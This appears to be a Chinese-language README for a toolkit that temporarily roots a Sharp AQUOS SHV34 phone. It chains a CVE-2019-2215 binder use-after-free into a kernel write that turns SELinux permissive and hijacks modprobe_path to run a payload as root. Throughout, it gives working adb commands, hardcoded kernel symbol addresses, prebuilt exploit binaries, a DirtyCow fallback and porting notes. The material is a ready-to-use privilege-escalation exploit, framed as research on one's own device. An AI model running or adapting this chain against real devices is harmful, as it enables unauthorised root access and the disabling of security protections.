# SHV34-Root-Toolkit

夏普 AQUOS SHV34（au/KDDI 日版）root 工具链，基于 **CVE-2019-2215**（binder UAF）+
内核符号提取 + modprobe 劫持。**不刷写任何分区**，数据无忧，重启即恢复原状。

```
binder UAF ──► 一次内核任意写 ──► selinux_enforcing = 0（Permissive）
                                  modprobe_path     = /data/local/tmp/wb.sh
           ──► 触发 request_module() ──► 内核以 root 执行 payload
           ──► setuid su（tmpfs）+ unix socket root shell（uid=0）
```

## 适用设备

| 项 | 值 |
|---|---|
| 机型 | SHARP AQUOS SHV34（`deckard_al40`，骁龙 820 MSM8996） |
| 系统 | Android 6.0.1 |
| 内核 | `3.18.20-perf`，arm64，SLUB，ticket spinlock，**KASLR 关闭** |
| SELinux | 强制（利用后转 Permissive，重启恢复） |
| 已验证 | `readv=69708/69708` → `getenforce` = Permissive → `rootshell id` = uid=0 |

同一内核线（3.18.x arm64、msm8996 一代、KASLR 关闭）的其他机型也可以移植，
见 exploit/[README.md](exploit/README.md) 的移植章节。

## 快速开始（临时 root）

前提：Python 3.8+、Android NDK（r21+）、adb、设备已开 USB 调试。

```bash
cd exploit
python deploy.py          # 自动：编译 → 推送 → 利用 → 触发 → 验证
```

不想编译的话，仓库里带了**已在本机验证成功**的预编译二进制
（`exploit/bin/`，SHA256 见下），手动三步即可：

```bash
adb push exploit/bin/probe26 exploit/bin/trig_bin exploit/bin/rootshell exploit/bin/su /data/local/tmp/
adb shell chmod 755 /data/local/tmp/{probe26,trig_bin,rootshell}
adb push exploit/payload/wb.sh /data/local/tmp/
adb shell chmod 755 /data/local/tmp/wb.sh

# ① 内核任意写（SELinux→Permissive，modprobe_path→wb.sh）
adb shell /data/local/tmp/probe26 -y -L /data/local/tmp/probe26.log
# ② 触发 request_module → 内核以 root 跑 wb.sh
adb shell /data/local/tmp/trig_bin
# ③ 验证
adb shell /data/local/tmp/rootshell id
# uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

之后日常使用：

```bash
adb shell /data/local/tmp/rootshell 'id; ls /data'   # 单条命令
adb shell /data/local/tmp/rootshell                  # 交互 shell
```

**注意（SHV34 特有）**：量产内核禁用了 setuid 位（`chmod 4755` 直接 EPERM，
详见 [docs/KERNEL-HARDENING.md](docs/KERNEL-HARDENING.md)），所以 `su` 的
setuid 提权在本机不可用——**rootshell 是唯一 root 入口**。`wb.sh` 里的
tmpfs su 流程是为其他可移植机型保留的，在 SHV34 上不影响 rootshell 工作。

**每次重启后失效**，重跑上面三步即可（一键脚本见 [scripts/ROOTME.sh](scripts/ROOTME.sh)）。

## 预编译二进制（2026-11-22 在 SHV34 实机验证通过）

| 文件 | 用途 |
|---|---|
| `probe26` | CVE-2019-2215 利用本体：一次链双写 `selinux_enforcing` + `modprobe_path` |
| `trig_bin` | 触发器：execve 畸形 binfmt → `request_module("binfmt-ffff")` |
| `rootshell` | root shell 守护进程/客户端（unix socket `/data/local/tmp/.rs`） |
| `su` | 最小 setuid su（部署为 `/data/local/tmp/.su.bin`，payload 拷到 tmpfs 后 4755） |
| `trig_sock` | 备选触发器：`socket(30)` → `request_module("net-pf-30")` |

`probe26` 的地址是 SHV34 专用（编译期 `-D` 注入，见下表）。换机型必须重编译。

## SHV34 内核符号地址

来自本机编译内核生成的 `System.map`（`_text = 0xffffffc000080000`，KASLR 关闭，
经 34 个 dmesg 崩溃栈符号锚点 + vdso 数据区逐字节比对双重校验）：

| 符号 | 地址 |
|---|---|
| `selinux_enforcing` | `0xffffffc001c7d9ac` |
| `modprobe_path` | `0xffffffc001a37b60` |

内核编译与符号校验的完整流程见 [kernel/README.md](kernel/README.md)。

## 安全须知与免责

- 利用过程存在内核崩溃（自动重启）风险；`panic_on_oops=1` 下任何一步错位都会重启，
  但不刷分区、不动 userdata，重启后一切照旧。
- 备份很重要：拿到临时 root 后**第一件事**是备份 boot 分区
  （见 [scripts/backup_boot.sh](scripts/backup_boot.sh)）。
- 本项目仅供自有设备的安全研究学习，禁止用于任何非法用途。
- 触发原语参考了公开 PoC（见 exploit/src/probe26.c 头部归属说明），内核写链为本工程实现。

## 永久 root（Magisk）路线

临时 root 重启即失效。永久 root 需要**先解 BL 锁**再刷 Magisk patch 过的 boot，
完整路线与现状说明见 [docs/PERMANENT-ROOT.md](docs/PERMANENT-ROOT.md)。

**为什么不建议装 SuperSU**：SHV34 量产内核有多层反 root 加固（/system 挂载
拦截、setuid 全局禁用、/vendor 叠挂防稳定），SuperSU 的安装模型需要写
/system + setuid，在锁 BL 状态下不可能成功，实测详见
[docs/KERNEL-HARDENING.md](docs/KERNEL-HARDENING.md)。

## 目录结构

```
shv34-root/
├── exploit/              # CVE-2019-2215 主利用
│   ├── src/              # probe26.c 等 6 个源文件
│   ├── payload/wb.sh     # 内核以 root 执行的脚本
│   ├── bin/              # 预编译二进制（SHV34 验证版）
│   ├── build.py          # NDK 交叉编译
│   ├── deploy.py         # 一键：编译+推送+利用+触发+验证
│   ├── HOW-IT-WORKS.md   # 漏洞原理、偏移、链条逐字节解析
│   └── README.md         # 构建部署细节 + 移植指南
├── kernel/               # 内核编译与符号提取（夏普 OSS 源码）
├── dirtycow/             # 备选攻击线：DirtyCow (CVE-2016-5195)
├── scripts/              # ROOTME.sh / boot 备份
├── docs/PERMANENT-ROOT.md
└── docs/KERNEL-HARDENING.md   # 量产内核反 root 加固实测（SuperSU 不可行的原因）
```

## 参考

- CVE-2019-2215 原始报告：Google Project Zero issue 1942
- 触发原语与工程实现：`FDLAlfrid/odin-od105-devkit`、`DimitriFourny/cve-2019-2215`
- 4.4 几何参考：`grant-h/qu1ckr00t`、`kangtastic/cve-2019-2215`

## 许可

MIT，见 [LICENSE](LICENSE)。
